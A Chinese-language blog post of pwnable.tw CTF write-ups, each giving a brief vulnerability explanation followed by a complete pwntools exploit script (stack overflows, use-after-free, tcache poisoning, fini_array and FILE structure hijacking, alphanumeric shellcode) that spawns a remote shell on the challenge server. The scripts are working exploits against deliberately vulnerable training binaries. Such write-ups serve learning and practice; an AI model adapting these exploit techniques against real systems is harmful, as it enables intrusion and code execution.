# pwnable.tw刷题记录(一)


当你在穿山越岭的另一边，我在孤独的路上没有尽头。				——《思念是一种病》 张震岳

<!--more-->

## start

程序存在一个简单的栈溢出，并且没有开启NX保护，所以可以向栈中写shellcode。唯一的难点就是没有办法泄漏stack地址，但是可以利用程序的第一句push esp来达到不泄漏地址而执行shellcode的目的。

````python
#Author: Nopnoping
from pwn import *

s      = lambda data               :sh.send(data) 
sa      = lambda delim,data         :sh.sendafter(delim, data)
sl      = lambda data               :sh.sendline(data)
sla     = lambda delim,data         :sh.sendlineafter(delim, data)
sea     = lambda delim,data         :sh.sendafter(delim, data)
r      = lambda numb=4096          :sh.recv(numb)
ru      = lambda delims, drop=True  :sh.recvuntil(delims, drop)
info_addr = lambda tag, addr        :sh.info(tag +': {:#x}'.format(addr))
itr     = lambda                    :sh.interactive()
debug	= lambda command=''			:gdb.attach(sh,command)

if args['REMOTE']:
	sh=remote('chall.pwnable.tw',10000)
else:
	sh=process('./start')

if args['I386']:
	context.arch='i386'
else:
	context.arch='amd64'

if args['DEBUG']:
	context.log_level='debug'

def exp():
	#debug("b*0x0804809C\nc")
	# shellcode='''
	# mov ecx,esp
	# add ecx,0x100
	# mov dl,0xff
	# mov al,3
	# int 0x80
	# jmp ecx
	# '''
	payload="\x00"*0x14+p32(0x08048060)+asm(shellcraft.sh())
	print hex(len(payload))
	sa(":",payload)
	payload="\x00"*0x14+p32(0x0804809C)
	sa(":",payload)
	# sleep(3)
	# s(asm(shellcraft.sh()))
	itr()

exp()
````

## orw

开启了沙盒，考察orw的shellcode书写。

注：写shellcode的一些技巧，灵活利用push 和pop来修改寄存器的值，这样可以减少shellcode的大小，还可以利用push来在栈上布置字符串，然后利用esp来访问。

````python
#Author: Nopnoping
from pwn import *

s      = lambda data               :sh.send(data) 
sa      = lambda delim,data         :sh.sendafter(delim, data)
sl      = lambda data               :sh.sendline(data)
sla     = lambda delim,data         :sh.sendlineafter(delim, data)
sea     = lambda delim,data         :sh.sendafter(delim, data)
r      = lambda numb=4096          :sh.recv(numb)
ru      = lambda delims, drop=True  :sh.recvuntil(delims, drop)
info_addr = lambda tag, addr        :sh.info(tag +': {:#x}'.format(addr))
itr     = lambda                    :sh.interactive()
debug	= lambda command=''			:gdb.attach(sh,command)

if args['REMOTE']:
	sh=remote('chall.pwnable.tw',10001)
else:
	sh=process("./orw")

if args['I386']:
	context.arch='i386'
else:
	context.arch='amd64'

if args['DEBUG']:
	context.log_level='debug'

def exp():
	#debug("b*0x0804858A\nc")
	shellcode='''
	push 5
	pop eax
	push 0x804a089
	pop ebx
	push 0
	pop ecx
	int 0x80

	mov ebx,eax
	push 3
	pop eax
	push 0x804a089
	pop ecx
	push 0x100
	pop edx
	int 0x80

	push 4
	pop eax
	push 1
	pop ebx
	int 0x80
	'''
	payload=asm(shellcode)+b"/home/orw/flag\x00"
	sla(":",payload)
	itr()

exp()
````

## calc(Fun)

在计算功能函数中，有一个数组的第一个元素用于储存输入表达式的读入数字数，而如果输入的第一个字符为+时，就可以篡改第一个元素，即修改读入数字的总数，进而可以实现任意地址修改，来实现ROP。

````python
#Author: Nopnoping
from pwn import *

s      = lambda data               :sh.send(data) 
sa      = lambda delim,data         :sh.sendafter(delim, data)
sl      = lambda data               :sh.sendline(data)
sla     = lambda delim,data         :sh.sendlineafter(delim, data)
sea     = lambda delim,data         :sh.sendafter(delim, data)
r      = lambda numb=4096          :sh.recv(numb)
ru      = lambda delims, drop=True  :sh.recvuntil(delims, drop)
info_addr = lambda tag, addr        :sh.info(tag +': {:#x}'.format(addr))
itr     = lambda                    :sh.interactive()
debug	= lambda command=''			:gdb.attach(sh,command)

if args['REMOTE']:
	sh=remote('chall.pwnable.tw',10100)
else:
	sh=process("./calc")

if args['I386']:
	context.arch='i386'
else:
	context.arch='amd64'

if args['DEBUG']:
	context.log_level='debug'

def modify_stack(addr_offset,value):
	payload="+"+str(addr_offset)+"-"+str(value)
	ru("\n")
	sl(payload)

def exp():
	mprotect=0x806F1F0
	read=0x806e6da
	bss=0x80EE000
	payload=[mprotect,0x08049812,bss,0x1000,7,read,bss+0x300,0x8049c30,0x80EE300-0x8049c30]
	#debug("b*0x08049812\nc")
	length=len(payload)-1
	while length>=0:
		modify_stack(0x168+length,payload[length])
		length-=1
	sl("")
	sleep(2)
	shellcode=asm(shellcraft.sh())
	sl(shellcode)
	itr()

exp()
````

## 3×17

可以任意地址写0x18的数据，但是只能写一次，程序是静态连接并且没有开启PIE，可以很容易想到去攻击fini_array。

![image-20201010202556381](C:\Users\10457\AppData\Roaming\Typora\typora-user-images\image-20201010202556381.png)

当程序退出时，先会执行[fini_array+8]处的代码，再执行[fini_array]。如果将fini_array=fini函数，fini_array+8=main，那么就可以不断的套娃，任意地址写。若在fini_array+16后面布置ROP，并且把fini_array=leave,ret  fini_array+8=ret，那么就可以实现栈迁移进而获得shell。

````python
#Author: Nopnoping
from pwn import *

s      = lambda data               :sh.send(data) 
sa      = lambda delim,data         :sh.sendafter(delim, data)
sl      = lambda data               :sh.sendline(data)
sla     = lambda delim,data         :sh.sendlineafter(delim, data)
sea     = lambda delim,data         :sh.sendafter(delim, data)
r      = lambda numb=4096          :sh.recv(numb)
ru      = lambda delims, drop=True  :sh.recvuntil(delims, drop)
info_addr = lambda tag, addr        :sh.info(tag +': {:#x}'.format(addr))
itr     = lambda                    :sh.interactive()
debug	= lambda command=''			:gdb.attach(sh,command)

if args['REMOTE']:
	sh=remote("chall.pwnable.tw","10105")
else:
	sh=process("./3x17")

if args['I386']:
	context.arch='i386'
else:
	context.arch='amd64'

if args['DEBUG']:
	context.log_level='debug'

def write_data(addr,data):
	ru("addr")
	sl(str(addr))
	ru("data")
	s(data)

def exp():
	fini=0x0000000000402960
	fini_array=0x00000000004B40F0
	main=0x0000000000401B6D
	syscall=0x0000000000472495
	rax_ret=0x000000000041e4af
	rdi_ret=0x0000000000401696
	rsi_ret=0x00000000004130be
	rdx_ret=0x0000000000446e35
	leave=0x0000000000401c4b
	ret=0x0000000000401016
	write_data(fini_array,p64(fini)+p64(main)+p64(rax_ret))
	write_data(fini_array+0x18,p64(59)+p64(rdi_ret)+p64(fini_array+0x58))
	write_data(fini_array+0x30,p64(rsi_ret)+p64(0)+p64(rdx_ret))
	write_data(fini_array+0x48,p64(0)+p64(syscall)+b"/bin/sh\x00")
	write_data(fini_array,p64(leave)+p64(ret)+p64(rax_ret))	
	itr()

exp()
````

## dubblesort

在读入数据时，没有限制数据的总数，存在栈溢出，可以布置ROP攻击链，只不过程序会对输入的数据进行一个冒泡排序。在输入名字时，由于没有初始化数据，可以泄漏栈上的垃圾数据来泄漏libc。

````python
#Author: Nopnoping
from pwn import *

s      = lambda data               :sh.send(data) 
sa      = lambda delim,data         :sh.sendafter(delim, data)
sl      = lambda data               :sh.sendline(data)
sla     = lambda delim,data         :sh.sendlineafter(delim, data)
sea     = lambda delim,data         :sh.sendafter(delim, data)
r      = lambda numb=4096          :sh.recv(numb)
ru      = lambda delims, drop=True  :sh.recvuntil(delims, drop)
info_addr = lambda tag, addr        :sh.info(tag +': {:#x}'.format(addr))
itr     = lambda                    :sh.interactive()
debug	= lambda command=''			:gdb.attach(sh,command)

if args['REMOTE']:
	sh=remote("chall.pwnable.tw",10101)
else:
	sh=process("./dubblesort")

if args['I386']:
	context.arch='i386'
else:
	context.arch='amd64'

if args['DEBUG']:
	context.log_level='debug'

def exp():
	libc=ELF("./libc_32.so.6")
	#debug("b*0x56555A32\nb*0x56555AF9\nc")
	sa(":","a"*28)
	ru("a"*28)
	libc_base=u32(r(4))-0x1ae244
	system=libc_base+libc.symbols['system']
	bin_sh=libc_base+libc.search("/bin/sh\x00").next()
	info_addr("libc_base",libc_base)
	info_addr("system",system)
	info_addr("bin_sh",bin_sh)
	sla("sort :",str(35))
	for i in range(24):
		sla("number :",str(0))
	sla("number :","+")
	for i in range(7):
		sla("number :",str(system-1))
	sla("number :",str(system))
	sla("number :",str(bin_sh-1))
	sla("number :",str(bin_sh))
	itr()

exp()
````

## hacknote

free后指针没有清零，存在UAF漏洞，并且堆块中有一个地址用于存放一个函数地址。因此我们可以利用UAF漏洞使得堆块重叠，再修改堆块函数地址的值，来获得shell。

````python
#Author: Nopnoping
from pwn import *

s      = lambda data               :sh.send(data) 
sa      = lambda delim,data         :sh.sendafter(delim, data)
sl      = lambda data               :sh.sendline(data)
sla     = lambda delim,data         :sh.sendlineafter(delim, data)
sea     = lambda delim,data         :sh.sendafter(delim, data)
r      = lambda numb=4096          :sh.recv(numb)
ru      = lambda delims, drop=True  :sh.recvuntil(delims, drop)
info_addr = lambda tag, addr        :sh.info(tag +': {:#x}'.format(addr))
itr     = lambda                    :sh.interactive()
debug	= lambda command=''			:gdb.attach(sh,command)

if args['REMOTE']:
	sh=remote("chall.pwnable.tw",10102)
else:
	sh=process("./hacknote")

if args['I386']:
	context.arch='i386'
else:
	context.arch='amd64'

if args['DEBUG']:
	context.log_level='debug'

def choice(elect):
	ru(':')
	sl(str(elect))

def add(size,content):
	choice(1)
	ru(':')
	sl(str(size))
	ru(":")
	s(content)

def show(index):
	choice(3)
	ru(':')
	sl(str(index))

def delete(index):
	choice(2)
	ru(':')
	sl(str(index))

def exp():
	libc=ELF("./libc_32.so.6")
	add(0x48,'aa') #0
	add(0x28,"aa") #1
	delete(0)
	delete(1)
	add(0x8,p32(0x0804862B)) #2
	show(0)
	__memalign_hook=u32(r(4))-48-0x20
	libc_base=__memalign_hook-libc.symbols["__memalign_hook"]
	system=libc_base+libc.symbols["system"]
	info_addr("libc_base",libc_base)
	delete(2)
	add(0x8,p32(system)+";sh\x00")
	show(0)
	itr()

exp()
````

## SilverBullet(Fun)

strncat函数会将第二个字符串的n个字符拼接到第一个字符串的末尾，并且在最后添加一个\x00，利用这一个特性，可以将存放字符串长度的变量溢出成0，进而再次读入时可以实现栈溢出。

````python
#Author: Nopnoping
from pwn import *

s      = lambda data               :sh.send(data) 
sa      = lambda delim,data         :sh.sendafter(delim, data)
sl      = lambda data               :sh.sendline(data)
sla     = lambda delim,data         :sh.sendlineafter(delim, data)
sea     = lambda delim,data         :sh.sendafter(delim, data)
r      = lambda numb=4096          :sh.recv(numb)
ru      = lambda delims, drop=True  :sh.recvuntil(delims, drop)
info_addr = lambda tag, addr        :sh.info(tag +': {:#x}'.format(addr))
itr     = lambda                    :sh.interactive()
debug	= lambda command=''			:gdb.attach(sh,command)

if args['REMOTE']:
	sh=remote('chall.pwnable.tw',10103)
else:
	sh=process("./silver_bullet")

if args['I386']:
	context.arch='i386'
else:
	context.arch='amd64'

if args['DEBUG']:
	context.log_level='debug'

def choice(elect):
	ru('choice :')
	sl(str(elect))

def creat_bullut(content):
	choice(1)
	ru(':')
	s(content)

def power_up(content):
	choice(2)
	ru(':')
	s(content)

def beat():
	choice(3)

def attack(ROP):
	creat_bullut("a"*0x2e)
	power_up("aa")
	power_up("\xf0"*3+p32(0x1010101)+ROP)
	beat()

def exp():
	libc=ELF("./libc_32.so.6")
	puts_plt=0x080484A8
	puts_got=0x0804AFDC
	main=0x08048954
	#debug("b*0x08048A18\nc")
	attack(p32(puts_plt)+p32(main)+p32(puts_got))
	ru("!!\n")
	puts=u32(r(4))
	libc_base=puts-libc.symbols["puts"]
	system=libc_base+libc.symbols["system"]
	bin_sh=libc_base+libc.search("/bin/sh").next()
	info_addr("libc_base",libc_base)
	attack(p32(system)+p32(main)+p32(bin_sh))
	itr()

exp()
````

## applestore(Fun)

这道题的漏洞是出在checkout中，当购买的手机金额达到7174时，就可以购买到一个储存在栈地址上的手机，而栈上的值可以在delete函数中进行修改，这样就可以利用双向链表的接链操作来进行任意地址的修改。

这里有一个难点就是不能直接修改got表上的值，比如如果想将atoi_got修改为system，那么也会将system修改为atoi_got而system地址是只读不能写的，就会报错，因此我们只能考虑使用ROP，想要使用ROP需要先泄漏heap和stack地址，泄漏之后如何实现ROP呢？程序并不存在栈溢出，我们只能使用dword shoot攻击方法。

dword shoot攻击方法假如有两个函数A B，B执行完后，A将会立刻执行leave ret，所以可以修改B的rbp，然后利用A的leave ret来实现栈迁移，栈迁移后就是普通的ROP了。

````python
#Author: Nopnoping
from pwn import *

s      = lambda data               :sh.send(data) 
sa      = lambda delim,data         :sh.sendafter(delim, data)
sl      = lambda data               :sh.sendline(data)
sla     = lambda delim,data         :sh.sendlineafter(delim, data)
sea     = lambda delim,data         :sh.sendafter(delim, data)
r      = lambda numb=4096          :sh.recv(numb)
ru      = lambda delims, drop=True  :sh.recvuntil(delims, drop)
info_addr = lambda tag, addr        :sh.info(tag +': {:#x}'.format(addr))
itr     = lambda                    :sh.interactive()
debug	= lambda command=''			:gdb.attach(sh,command)

if args['REMOTE']:
	sh=remote("chall.pwnable.tw",10104)
else:
	sh=process("./applestore")

if args['I386']:
	context.arch='i386'
else:
	context.arch='amd64'

if args['DEBUG']:
	context.log_level='debug'

def choice(elect):
	ru('> ')
	sl(str(elect))

def add(index):
	choice(2)
	ru('> ')
	sl(str(index))

def delete(index):
	choice(3)
	ru('> ')
	s(index)

def cart(c):
	choice(4)
	ru("> ")
	s(c)

def checkout():
	choice(5)
	ru("> ")
	sl("y")

def exp():
	libc=ELF("./libc_32.so.6")
	atoi_got=0x0804B040
	#debug("b*0x08048C86\nc")
	for i in range(6):
		add(1)
	for i in range(20):
		add(2)
	checkout()
	delete("27"+p32(atoi_got)+"a"*4+p32(0)*2)
	ru("27:")
	atoi=u32(r(4))
	libc_base=atoi-libc.symbols['atoi']
	system=libc_base+libc.symbols['system']
	bin_sh=libc_base+libc.search("/bin/sh").next()
	info_addr("atoi",atoi)
	info_addr("libc_base",libc_base)
	info_addr("system",system)
	delete("27"+p32(0x0804B068+8)+"a"*4+p32(0)*2)
	ru("27:")
	heap=u32(r(4))
	info_addr("heap",heap)
	delete("27"+p32(heap+0x4a0)+"a"*4+p32(0)*2)
	ru("27:")
	stack=u32(r(4))
	info_addr("stack",stack)
	#dword shoot
	delete("27"+p32(heap)+p32(0)+p32(stack+0x40)+p32(stack+0x60-8))
	sla("> ","6\x00"+p32(0)+p32(system)+p32(system)+p32(bin_sh))
	itr()

exp()
````

## Re-alloc

这道题主要考察队realloc函数的理解，当realloc的size为零时将会释放指向的堆块并返回零，size不为零时，会释放掉之前的块再重新分配一个。

利用size为0的这个特性，可以造成UAF漏洞，但是程序没有显示功能所以需要攻击IO_file来获得libc，但是这里提供一个新的思路，就是修改atoll为printf，然后就有一个格式化字符串漏洞，利用这个漏洞就可以泄漏得到libc，进而获得shell。

````python
#Author: Nopnoping
from pwn import *

s      = lambda data               :sh.send(data) 
sa      = lambda delim,data         :sh.sendafter(delim, data)
sl      = lambda data               :sh.sendline(data)
sla     = lambda delim,data         :sh.sendlineafter(delim, data)
sea     = lambda delim,data         :sh.sendafter(delim, data)
r      = lambda numb=4096          :sh.recv(numb)
ru      = lambda delims, drop=True  :sh.recvuntil(delims, drop)
info_addr = lambda tag, addr        :sh.info(tag +': {:#x}'.format(addr))
itr     = lambda                    :sh.interactive()
debug	= lambda command=''			:gdb.attach(sh,command)

if args['REMOTE']:
	sh=remote("chall.pwnable.tw",10106)
else:
	sh=process("./re-alloc")

if args['I386']:
	context.arch='i386'
else:
	context.arch='amd64'

if args['DEBUG']:
	context.log_level='debug'

def choice(elect):
	ru(':')
	sl(str(elect))

def add(index,size,content):
	choice(1)
	ru(':')
	sl(str(index))
	ru(':')
	sl(str(size))
	ru(':')
	s(content)

def re_alloc(index,size,content):
	choice(2)
	ru(':')
	sl(str(index))
	ru(":")
	sl(str(size))
	if size!=0:
		ru(':')
		sl(content)

def delete(index):
	choice(3)
	ru(':')
	sl(str(index))

def exp():
	elf=ELF("./re-alloc")
	libc=ELF("./libc.so")
	add(0,0x18,"a")
	re_alloc(0,0,"")
	re_alloc(0,0x18,p64(elf.got["atoll"]))
	add(1,0x18,"a")

	re_alloc(0,0x28,"a")
	re_alloc(1,0x28,"a")
	delete(1)
	re_alloc(0,0x28,p64(elf.got["atoll"]))
	add(1,0x28,"a")

	re_alloc(0,0x38,"a")
	re_alloc(1,0x38,"a")
	delete(0)
	re_alloc(1,0x38,p64(0)*2)
	delete(1)

	add(0,0x28,p64(elf.plt["printf"]))

	choice(3)
	sla(":","%7$p")
	libc_base=int(ru("\n").replace("\n",""),16)-libc.symbols["_IO_2_1_stdout_"]
	info_addr("libc_base",libc_base)
	system=libc_base+libc.symbols['system']
	#debug("b*0x00000000004013C9\nc")
	choice(1)
	sla("Index:","A\x00")
	sla("Size:","a"*15)
	sla(":",p64(system))
	choice(3)
	sla(":","/bin/sh\x00")
	itr()

exp()
````

## Tcache Tear

存在一个UAF漏洞，关键在于如何泄漏libc地址。程序在开头是要求输入一个name，并且还有显示name的功能，可以想到在name处构造一个fakechunk来泄漏libc。

````python
#Author: Nopnoping
from pwn import *
import struct
s      = lambda data               :sh.send(data) 
sa      = lambda delim,data         :sh.sendafter(delim, data)
sl      = lambda data               :sh.sendline(data)
sla     = lambda delim,data         :sh.sendlineafter(delim, data)
sea     = lambda delim,data         :sh.sendafter(delim, data)
r      = lambda numb=4096          :sh.recv(numb)
ru      = lambda delims, drop=True  :sh.recvuntil(delims, drop)
info_addr = lambda tag, addr        :sh.info(tag +': {:#x}'.format(addr))
itr     = lambda                    :sh.interactive()
debug	= lambda command=''			:gdb.attach(sh,command)

if args['REMOTE']:
	sh=remote("chall.pwnable.tw",10207)
else:
	sh=process("./tcache_tear")

if args['I386']:
	context.arch='i386'
else:
	context.arch='amd64'

if args['DEBUG']:
	context.log_level='debug'

def choice(elect):
	ru(':')
	sl(str(elect))

def add(size,content):
	choice(1)
	ru(':')
	sl(str(size))
	ru(":")
	s(content)

def delete():
	choice(2)

def exp():
	libc=ELF("./libc.so")
	elf=ELF("./tcache_tear")
	name=0x0000000000602060
	atoll=elf.got["atoll"]
	printf=elf.plt["printf"]
	#make fake chunk
	sla(":",p64(0)+p64(0x501))
	#make bk chunk
	add(0xff,"a")
	delete()
	delete()
	add(0xff,p64(name+0x500))
	add(0xff,"\x00")
	add(0xff,p64(0)+p64(0x21)+p64(0)*2+p64(0)+p64(0x21))
	#get fake chunk point
	add(0x70,"a")
	delete()
	delete()
	add(0x70,p64(name+0x10))
	add(0x70,"\x00")
	add(0x70,"\x00")
	delete()
	#leak
	choice(3)
	ru(":"+p64(0)+p64(0x501))
	malloc_hook=u64(r(8))-96-0x10
	libc_base=malloc_hook-libc.symbols["__malloc_hook"]
	free_hook=libc_base+libc.symbols["__free_hook"]
	system=libc_base+libc.symbols["system"]
	info_addr("libc_base",libc_base)
	info_addr("system",system)
	info_addr("free_hook",free_hook)
	#get shell
	for i in range(5):
		add(0xf0,"aa")
	add(0x60,"a")
	delete()
	delete()
	add(0x60,p64(free_hook))
	add(0x60,p64(0))
	add(0x60,p64(system))
	add(0x20,"/bin/sh\x00")
	delete()
	itr()

exp()
````

## seethefile(Fun)

这道题十分有趣，首先泄漏libc是通过打开/pro/self/maps这个文件来得到。得到libc后，在输入name时，没有限制读入name的长度，导致程序会溢出覆盖fd，因此可以伪造一个文件结构和虚函数表，来获得shell。这里由于会调用fclose函数，而fclose会调用_IO_finish_t，因此可以构造虚函数表中该函数的地址来获得shell。

````python
#Author: Nopnoping
from pwn import *
from struct import *
s      = lambda data               :sh.send(data) 
sa      = lambda delim,data         :sh.sendafter(delim, data)
sl      = lambda data               :sh.sendline(data)
sla     = lambda delim,data         :sh.sendlineafter(delim, data)
sea     = lambda delim,data         :sh.sendafter(delim, data)
r      = lambda numb=4096          :sh.recv(numb)
ru      = lambda delims, drop=True  :sh.recvuntil(delims, drop)
info_addr = lambda tag, addr        :sh.info(tag +': {:#x}'.format(addr))
itr     = lambda                    :sh.interactive()
debug	= lambda command=''			:gdb.attach(sh,command)

if args['REMOTE']:
	sh=remote("chall.pwnable.tw",10200)
else:
	sh=process("./seethefile")

if args['I386']:
	context.arch='i386'
else:
	context.arch='amd64'

if args['DEBUG']:
	context.log_level='debug'
def pack_file_32(_flags = "\x80\x80||",
              _IO_read_ptr = "sh\x00\x00",
              _IO_read_end = 0,
              _IO_read_base = 0,
              _IO_write_base = 0,
              _IO_write_ptr = 0,
              _IO_write_end = 0,
              _IO_buf_base = 0,
              _IO_buf_end = 0,
              _IO_save_base = 0,
              _IO_backup_base = 0,
              _IO_save_end = 0,
              _IO_marker = 0,
              _IO_chain = 0,
              _fileno = 0,
              _lock = 0,
              _mode = 0):
    struct = _flags + \
             _IO_read_ptr+ \
             p32(_IO_read_end)+ \
             p32(_IO_read_base) + \
             p32(_IO_write_base) + \
             p32(_IO_write_ptr) + \
             p32(_IO_write_end) + \
             p32(_IO_buf_base) + \
             p32(_IO_buf_end) + \
             p32(_IO_save_base) + \
             p32(_IO_backup_base) + \
             p32(_IO_save_end) + \
             p32(_IO_marker) + \
             p32(_IO_chain) + \
             p32(_fileno)
    struct = struct.ljust(0x94, "\x00")
    return struct

def choice(elect):
	ru('choice :')
	sl(str(elect))

def openfile(filename):
	choice(1)
	ru(':')
	sl(filename)

def readfile():
	choice(2)

def writefile():
	choice(3)

def closefile():
	choice(4)

def exp():
	libc=ELF("./libc_32.so.6")
	name=0x0804B260
	#debug("b*0x08048B0F\nc")
	openfile("/proc/self/maps")
	readfile()
	writefile()
	readfile()
	writefile()
	ru("\n")
	libc_base=int(ru("-").replace("-","\x00"),16)
	system=libc_base+libc.symbols["system"]
	info_addr("libc_base",libc_base)
	info_addr("system",system)
	choice(5)
	fd=pack_file_32()+p32(name)
	payload=p32(0)*2+p32(system)
	payload=payload.ljust(0x20,"\x00")
	payload+=p32(name+0x30)
	payload=payload.ljust(0x30,"\x00")
	payload+=fd
	sla(":",payload)
	itr()

exp()
````

## Death Note

对于数组的下标没有严格的判断，可以为负数，存在溢出，并且没有开启NX，所以考虑写shellcode，但是读入的字符必须为可写字符，这就使得可以使用的指令大大减少。像syscall这样的指令就没办法读入了，只能通过sub等等指令，动态的修改shellcode。

````python
#Author: Nopnoping
from pwn import *

s      = lambda data               :sh.send(data) 
sa      = lambda delim,data         :sh.sendafter(delim, data)
sl      = lambda data               :sh.sendline(data)
sla     = lambda delim,data         :sh.sendlineafter(delim, data)
sea     = lambda delim,data         :sh.sendafter(delim, data)
r      = lambda numb=4096          :sh.recv(numb)
ru      = lambda delims, drop=True  :sh.recvuntil(delims, drop)
info_addr = lambda tag, addr        :sh.info(tag +': {:#x}'.format(addr))
itr     = lambda                    :sh.interactive()
debug	= lambda command=''			:gdb.attach(sh,command)

if args['REMOTE']:
	sh=remote("chall.pwnable.tw",10201)
else:
	sh=process("./death_note")

if args['I386']:
	context.arch='i386'
else:
	context.arch='amd64'

if args['DEBUG']:
	context.log_level='debug'

def choice(elect):
	ru(':')
	sl(str(elect))

def add(index,shellcode):
	choice(1)
	ru(':')
	sl(str(index))
	ru(":")
	sl(shellcode)

def delete(index):
	choice(3)
	ru(":")
	sl(str(index))


def exp():
	#debug("b*0x08048873\nc")
	shellcode='''
	push 0x68
	push 0x732f2f2f
	push 0x6e69622f
	push esp
	pop  ebx

	push 0x33
	pop  ecx
	sub byte ptr [eax+0x2d],cl
	push 0x40
	pop  ecx
	sub byte ptr [eax+0x2e],cl
	sub byte ptr [eax+0x2e],cl

	push 0x61
	pop  eax
	sub  al,0x61
	push eax
	pop  ecx
	push eax
	pop  edx

	push 0x61
	pop  eax
	xor  al,0x6a

	push eax
	pop  eax
	'''
	payload=asm(shellcode)
	offset=-(0x804A060-0x0804A014)/4
	add(offset,payload)
	delete(offset)
	itr()

exp()
````

## spirited_away

## babystack

login和cpy的栈环境是一样的，可以利用在login中构造ROP，cpy中来把ROP数据粘贴过去造成溢出。

````python
#Author: Nopnoping
from pwn import *
import time
import struct
s      = lambda data               :sh.send(data) 
sa      = lambda delim,data         :sh.sendafter(delim, data)
sl      = lambda data               :sh.sendline(data)
sla     = lambda delim,data         :sh.sendlineafter(delim, data)
sea     = lambda delim,data         :sh.sendafter(delim, data)
r      = lambda numb=4096          :sh.recv(numb)
ru      = lambda delims, drop=True  :sh.recvuntil(delims, drop)
info_addr = lambda tag, addr        :sh.info(tag +': {:#x}'.format(addr))
itr     = lambda                    :sh.interactive()

if args['REMOTE']:
	sh=remote("chall.pwnable.tw",10205)
else:
	sh=process("./babystack")

if args['I386']:
	context.arch='i386'
else:
	context.arch='amd64'

if args['DEBUG']:
	context.log_level='debug'

def debug(command=''):
	context.terminal = ['tmux', 'splitw', '-h']
	gdb.attach(sh,command)

def login(content="\x00"):
	ru(">> ")
	sl("1")
	ru(":")
	s(content)

def magic_copy(content):
	ru(">> ")
	sl("3")
	ru(":")
	s(content)

def leak(length):
	data=""
	for i in range(length):
		for j in range(1,256):
			tmp_data=data+chr(j)+"\x00"
			login(tmp_data)
			ru("i")
			msg=ru("\n").decode().replace("\n",'\x00')
			if msg=="n Success !":
				print("get%d"%i)
				ru(">> ")
				sl("1")
				data=data+chr(j)
				break
	return data

def exp():
	libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
	#leak passwd
	passwd=leak(16)
	login(passwd+"\x00"+"a"*0x37)
	#leak libc
	magic_copy("a"*0x11)
	ru(">> ")
	sl("1")
	file_setbuf=u64(leak(16).replace("a","").ljust(8,"\x00"))-9
	info_addr("file",file_setbuf)
	libc_base=file_setbuf-libc.symbols["_IO_file_setbuf"]
	onegadget=libc_base+0xf1207
	info_addr("onegadget",onegadget)
	info_addr("libc_base",libc_base)
	#ROP
	a=u64(passwd[0:8])
	b=u64(passwd[8:])
	payload=b"a"*0x7+b"\x00"+b"a"*0x38+p64(a)+p64(b)+b"a"*0x18+p64(onegadget)
	login(payload)
	magic_copy(b"a"*0x8)
	#get shell
	ru(">>")
	sl("2")
	itr()

exp()

````




